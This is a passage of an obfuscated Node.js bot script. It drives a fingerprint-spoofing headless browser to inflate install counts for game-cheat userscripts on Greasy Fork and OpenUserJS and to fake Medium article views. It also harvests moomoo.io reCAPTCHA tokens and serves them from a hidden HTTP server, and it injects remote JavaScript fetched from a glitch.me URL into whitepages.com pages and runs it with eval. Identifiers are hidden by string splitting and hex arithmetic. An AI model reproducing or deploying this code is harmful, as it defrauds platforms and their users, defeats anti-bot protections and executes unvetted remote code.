      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0xa)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x14) + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0xf, 'BSVJ') + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x7, 'bB&A') + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + W(0x10) + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    V(0x5, '7IFI') + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + X(0x1a) + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x257b * -0x1 + -0x225f + 0x2 * 0x23ed
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + Y(0xe) + 'er'](0x12b0 + 0x25 * 0x63 + -0x20ff)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x304 + -0x15c9 + 0x1329), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1db6 + 0x4a + 0x30 * 0x9f), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x11a4 + -0x8 * -0x16 + 0x10f4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x20ef + 0x12c3 + -0x716 * -0x2; w < getRandomInt(0x229 + -0x1b41 * -0x1 + -0x1d69, 0x1ab1 + 0xd7b + -0x2827); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x142b * -0xb + -0x37f4 + 0x2002d);
        }
      }();
    }, -0x1236 + -0x1 * -0xeda + -0xf * -0x40), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x112e + 0x5 * 0x139 + 0xb11;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x130c + 0x16 * -0x110 + -0x3 * -0xe24, 0x47 * 0x17 + 0x1e7 * 0xa + 0x867 * -0x3)), !z['includes'](Z(0x0)))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x99d0 + -0x9f * -0x16d + 0x2c4d);
    }, -0xd18 + 0x1d * 0x151 + -0x3 * 0x83b), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a0 = c;
        try {
          let s = -0xaf1 * 0x1 + -0x1 * 0x1ddb + -0x5d4 * -0x7;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x851 + 0x188 + 0x1df), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1032 + 0x1 * 0x103d + -0xb), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x293 * 0x347 + 0x2 * 0x6ae47 + 0x467 * -0x1d5);
        } catch (v) {}
        return await page[a0(0x8)](), await context['close'](), r();
      }());
    }, -0x1db7 * -0x1 + -0xcb6 + -0x109d);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a1 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x9f7 + 0x3d + -0x541 * -0x2);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + a1(0x17) + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x11a5 * -0x3 + 0x2 * 0x105b + -0x1eb * -0x1b);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = b,
    a3 = c,
    a2 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x13f * -0xc + -0x1 * 0x1044 + 0x151) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x5f2 * 0x2 + 0xdf * 0x1f + 0x78e * -0x2));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x2a * -0x9 + -0x1f82 + 0x20fc, D['indexOf']('\x20'));
        return B ? E['slice'](0x1 * 0x14e3 + 0x3bf * 0x5 + -0x39a * 0xb, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xe07 + 0x3 * 0x100f + -0x1724),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x16ba + 0x4a68 + 0x143 * -0xa),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a2(0x19) + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + a3(0x4) + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + a3(0xb) + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
